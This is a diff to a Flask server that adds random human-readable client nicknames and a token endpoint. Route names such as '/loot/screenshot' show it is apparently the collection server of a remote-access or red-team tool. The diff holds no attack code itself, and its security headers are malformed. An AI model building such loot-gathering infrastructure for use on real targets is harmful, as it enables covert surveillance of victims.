@@ -12,6 +12,7 @@ from enum import Enum
 from user_agents import parse
 import magic
 import json
+import uuid
 import os
 import time
 import threading
@@ -36,8 +37,6 @@ app.config['SESSION_COOKIE_SECURE']   = True
 app.config['SESSION_COOKIE_HTTPONLY'] = True
 app.config['SESSION_COOKIE_SAMESITE'] = 'Strict'
 
-# This breaks the login page, not authenticated yet!
-# app.view_functions['static'] = login_required(app.send_static_file)
 db = SQLAlchemy(app)
 login_manager = LoginManager()
 login_manager.login_view = 'login'
@@ -94,6 +93,96 @@ databaseLock = ""
 
 
 logFileName = "sessionLog.txt"
+
+
+
+# Needed to generate human readable nicknames
+AdjectiveList = {
+        "funky",
+        "smelly",
+        "skunky",
+        "merry",
+        "whimsical",
+        "amusing",
+        "hysterical",
+        "bumfuzzled",
+        "bodacious",
+        "absurd",
+        "animated",
+        "brazen",
+        "cheesy",
+        "clownish",
+        "confident",
+        "crazy",
+        "cuckoo",
+        "deranged",
+        "ludicrous",
+        "playful",
+        "quirky",
+        "screwball",
+        "slapstick",
+        "wacky",
+        "excited",
+        "humorous",
+        "charming",
+        "confident",
+        "fanatical"
+}
+
+ColorList = {
+        "blue",
+        "red",
+        "green",
+        "white",
+        "black",
+        "brown",
+        "azure",
+        "pink",
+        "yellow",
+        "silver",
+        "purple",
+        "orange",
+        "grey",
+        "fuchsia",
+        "crimson",
+        "lime",
+        "plum",
+        "olive",
+        "cyan",
+        "ivory",
+        "magenta"
+}
+
+
+MurderCritter = {
+        "kangaroo",
+        "koala",
+        "dropbear",
+        "wombat",
+        "wallaby",
+        "dingo",
+        "emu",
+        "tassiedevil",
+        "platypus",
+        "salty",
+        "kookaburra",
+        "boxjelly",
+        "blueringoctopus",
+        "taipan",
+        "stonefish",
+        "redback",
+        "cassowary",
+        "funnelwebspider",
+        "conesnail",
+        "quokka",
+        "echidna",
+        "dugong",
+        "sugarglider",
+        "blackswan"
+}
+
+
+
 
 
 
@@ -403,7 +492,6 @@ def clientSeen(identifier, ip, userAgent):
 # Needed by flask-login
 @login_manager.user_loader
 def user_loader(username):
-    # return User.query.get(username)
     return User.query.filter_by(username=username).first()
 
 
@@ -427,14 +515,40 @@ def addAdminUser():
 
 
 
+# Generate a client nickname
+# If a client already has the nickname, append a number to 
+# the end so they're unique
+def generateNickname():
+    randomAdjective = random.choice(list(AdjectiveList))
+    randomColor     = random.choice(list(ColorList))
+    randomCritter   = random.choice(list(MurderCritter))
+
+    newNickname = randomAdjective + '-' + randomColor + '-' + randomCritter
+
+    counter = 0
+    while Client.query.filter_by(nickname=newNickname).count():
+        baseNickname = newNickname.replace('-'+ str(counter), '')
+        # print("Base nickname created: " + baseNickname)
+        counter += 1
+
+
+        newNickname = baseNickname + '-' + str(counter)
+        # print("Still looping for name, counter: " + str(counter))
+        # print("Current newNickname: " + newNickname)
+
+    return newNickname
+
+
+
+
 #***************************************************************************
 # Response header handling
 @app.after_request
 def afterRequestHeaders(response):
-    response.headers['Strict-Transport-Security']   = 'max-age=31536000; includeSubDomains'
-    response.headers['X-Content-Type-Options']      = 'nosniff'
-    response.headers['X-Frame-Options']             = 'DENY'
-    response.headers['Content-Security-Policy']     = "default-src 'self' style-src 'self' script-src 'self' connect-sec 'self' img-src 'self' data: frame-ancestors 'none' object-src 'self'  'unsafe-inline'"
+    response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
+    response.headers['X-Content-Type-Options']    = 'nosniff'
+    response.headers['X-Frame-Options']           = 'DENY'
+    response.headers['Content-Security-Policy']   = "default-src 'self' style-src 'self' script-src 'self' connect-sec 'self' img-src 'self' data: frame-ancestors 'none' object-src 'self'  'unsafe-inline'"
 
     # Server header is set in main function
  
@@ -561,7 +675,22 @@ def logout():
 
 
 #***************************************************************************
-# Loot API endpoints
+# Loot and Payload Client API endpoints
+
+# Get UUID for client token
+@app.route('/client/getToken', methods=['GET'])
+def returnUUID():
+    token = uuid.uuid4()
+
+    uuidData = {'clientToken':token}
+
+
+    print("Nickname generated: " + generateNickname())
+
+    return jsonify(uuidData)
+
+
+
 
 # Capture screenshot
 @app.route('/loot/screenshot/<identifier>', methods=['POST'])
